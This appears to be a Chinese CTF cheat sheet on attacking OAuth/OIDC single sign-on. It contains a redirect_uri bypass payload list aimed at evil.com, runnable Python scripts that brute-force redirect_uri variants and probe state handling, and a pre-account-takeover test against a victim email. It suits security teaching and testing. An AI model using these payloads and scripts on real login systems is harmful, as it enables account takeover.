---
title: OAuth 2.0 / OIDC 与 SSO 绕过（redirect_uri、state、账号接管）
category: web
tags: [oauth, oidc, sso, account-takeover, redirect-uri]
signals:
  - "登录页有「使用 GitHub 登录」「使用 Google 登录」按钮"
  - "URL 里出现 response_type=code&client_id= 组合"
  - "回调地址形如 /oauth/callback?code=xxx&state=yyy"
  - "参数里有 redirect_uri 且改动后仍然放行"
  - "state 参数缺失，或同一 state 可以重复使用"
  - "存在 /auth/link 或 /social-bind 账号绑定接口"
  - "登录后 URL 片段里出现 access_token（implicit 流）"
  - "前端打包 JS 里搜到了 client_secret"
  - "题面提示词出现 账号接管 / 单点登录 / SSO / callback"
difficulty: hard
source: "PortSwigger / HackTricks / OWASP WSTG"
tools: [burpsuite, python, requests]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 登录/绑定流程 URL 带 `client_id=`、`redirect_uri=`、`response_type=code`、`scope=openid profile email`。
- 回调端点 `GET /oauth/callback?code=xxx&state=yyy`。
- 修改 `redirect_uri` 之后仍能跳到我们的域（或被截断、被拼接）。
- 绑定接口 `/auth/link` 直接信任 `code`，不校验 `state`。
- 前端出现 `access_token` in URL fragment（implicit flow，`response_type=token`）。
- 题面提示：`OAuth`、`SSO`、`单点登录`、`callback`、`token`、`账号接管`、`csrf`。
- 有 `email_verified: false` 但登录逻辑直接按 email 合并账号。

## 二、原理

### 1. 基本流程

```
① 浏览器 -> 授权服务器: GET /authorize?client_id=A&redirect_uri=R&response_type=code&state=S
② 授权服务器 -> 浏览器 -> R?code=CODE
③ 后端 -> 授权服务器: POST /token  (client_id, client_secret, code)
④ 授权服务器 -> 后端: access_token (+ id_token)
```

### 2. 六类常见缺陷

| 缺陷 | 后果 | 检测方法 |
|---|---|---|
| **redirect_uri 校验缺陷** | code 被劫持到攻击域 → 接管 | 改后缀、加 `@`、加 `../`、加 `?`、换 `http`、子域名 |
| **state 缺失/不校验** | CSRF 把攻击者的 code 塞给受害者 → 受害者账号被绑到攻击者 |
| **Implicit flow 泄漏** | `access_token` 在 fragment，可被 Referer 泄漏 | 看登录后 URL |
| **Pre-account takeover** | 用未验证邮箱注册 OAuth 账号，占住受害者邮箱 | 注册后看是否要求验证 |
| **Client secret 泄漏** | 前端 JS 里有 secret → 任意伪造 code 交换 | 搜 `.js` 文件 |
| **RFC 7636 PKCE 缺失** | 配合 redirect_uri 劫持，直接换 token | 看 `/authorize` 有没有 `code_challenge` |

### 3. redirect_uri 绕过清单（最重要）

```
https://app.target.com.evil.com/cb          # 域名后缀
https://evil.com/app.target.com/cb          # 路径里含合法域
https://app.target.com@evil.com/cb          # userinfo 混淆
https://app.target.com/cb/../../evil        # 路径穿越
https://app.target.com/cb?x=https://evil    # 参数注入
https://app.target.com/cb#@evil.com         # fragment 混淆
https://app.target.com:443@evil.com         # 端口错位
HTTPS://APP.TARGET.COM                      # 大小写
https://app.target.com\.evil.com            # 反斜杠
```

## 三、解题步骤

1. **拦截 `/authorize`**：记录 `client_id`、`redirect_uri`、`response_type`、`scope`、`state`。
2. **打 redirect_uri**：按上面清单逐个改，看回调是否落到我们控制的地址。
3. **打 state**：把 state 删掉 / 改固定值 / 复用，构造 CSRF 链接让受害者点。
4. **打 implicit**：如 `response_type=token`，登录后看 fragment 中是否有 token，若有则用 Referer 泄漏或 `window.name` 侧漏。
5. **服务端 code 交换**：确认后端 `/oauth/callback` 是否校验 `client_secret`；无则自造 code 换 token（需看授权服务器是否校验 code 与 client 绑定）。
6. **账号接管**：把获取到的 token/用户信息替换为受害者 email → 登录。
7. **验证**：用新会话访问 `/profile` 看是否已是受害者。

## 四、可直接运行的脚本

redirect_uri 变体爆破：

```python
import requests

AUTH = "https://auth.TARGET/authorize"
CLIENT = "CLIENT_ID"
BASE = "https://app.TARGET/oauth/callback"

variants = [
    BASE + ".evil.com",
    "https://evil.com" + BASE,
    BASE.replace("https://", "https://evil.com@"),
    BASE + "/../../evil",
    BASE + "?next=https://evil.com",
    BASE + "#@evil.com",
    BASE.replace("https://", "http://"),
    BASE.upper(),
    "https://app.TARGET.evil.com/oauth/callback",
]

for v in variants:
    r = requests.get(AUTH, params={
        "client_id": CLIENT, "redirect_uri": v,
        "response_type": "code", "scope": "openid profile email",
        "state": "s1"}, allow_redirects=False, timeout=15)
    loc = r.headers.get("Location", "")
    print(("PASS " if r.status_code in (301, 302) else "FAIL "),
          r.status_code, v, "->", loc[:100])
```

state 缺失 / 固定值检测：

```python
import requests

AUTH = "https://auth.TARGET/authorize"
for st in ["", "s1", "s1", "s1"]:
    r = requests.get(AUTH, params={
        "client_id": "CLIENT_ID",
        "redirect_uri": "https://app.TARGET/oauth/callback",
        "response_type": "code", "state": st}, allow_redirects=False)
    print(r.status_code, r.headers.get("Location"))
```

Pre-account takeover 验证（注册后看是否要求 email 验证）：

```python
import requests
s = requests.Session()
# ① 用 OAuth 以 "victim@target.com" 注册（若 IdP 允许邮箱不验证）
# ② 退出，再用"邮箱+密码"注册接口尝试同一邮箱
r = s.post("https://app.TARGET/api/register",
           json={"email": "victim@target.com", "password": "A12345678"})
print(r.status_code, r.text[:200])   # 若 200 → 可直接接管
```

PKCE 缺失检测：

```bash
curl -sI -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  'https://auth.TARGET/authorize?client_id=CLIENT_ID&redirect_uri=https://app.TARGET/oauth/callback&response_type=code&response_mode=query&scope=openid'
```

## 五、常见坑 / 变体

- **redirect_uri 必须完全匹配**：只能打 **open redirect 在同域**（app.target.com 上的任何跳转都是合法落点）。
- **`state` 有但只随机不校验**：把 `state` 换成 `session` 里的值再回来，看是否 400。
- **Implicit flow 已被 OAuth 2.1 弃用**：但老站点还有，重点看 `response_mode=fragment`。
- **OIDC `id_token` 校验缺陷**：`alg=none`、`kid` 注入、`aud` 不校验 → 见 `jwt-forge.md`。
- **SAML 混合**：有时 SSO 端点同时支持 SAML 与 OIDC，见 `saml-xsw-attack.md`。
- **变体：账号绑定接口不校验 code 归属**（`/auth/link?code=`）→ 把受害者 code 绑到自己账户。
- **变体：`email_verified=false` 仍信任**（Facebook/Google 老行为）→ 直接注册受害者邮箱。
- **变体：多个 `redirect_uri` 参数**（`&redirect_uri=legit&redirect_uri=evil`）→ 不同层取不同值。
- **变体：URL 解析差异**（如 `%0d%0a` 注入 Location）。
- **注意**：部分 IdP（如 GitHub）严格校验，别浪费时间在 redirect_uri 上，转去打 state / 绑定接口。

## 六、参考来源

- [PortSwigger — OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)
- [HackTricks — OAuth to Account takeover](https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html)
- [OWASP WSTG — Testing OAuth](https://github.com/OWASP/wstg)
- [RFC 6749 — The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749)
- [RFC 7636 — PKCE](https://www.rfc-editor.org/rfc/rfc7636)
- [PortSwigger — CSRF bypassing SameSite](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
